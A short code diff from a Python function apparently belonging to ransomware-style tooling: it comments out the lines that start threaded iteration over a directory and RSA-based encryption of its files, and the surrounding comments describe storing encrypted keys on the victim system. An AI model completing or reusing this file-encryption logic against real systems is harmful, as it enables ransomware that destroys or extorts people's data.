@@ -344,8 +344,8 @@ def encrypt_files(args):
             return res
 
         if os.path.isdir(target):
-            globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
-            globals()['threads']['encrypt_files'] = _threader(rsa_key)
+            # globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
+            # globals()['threads']['encrypt_files'] = _threader(rsa_key)
 
             # Save the encrypted keys as an encrypted file on the system
             # Can be removed whenever or left on system since RSA encrypted
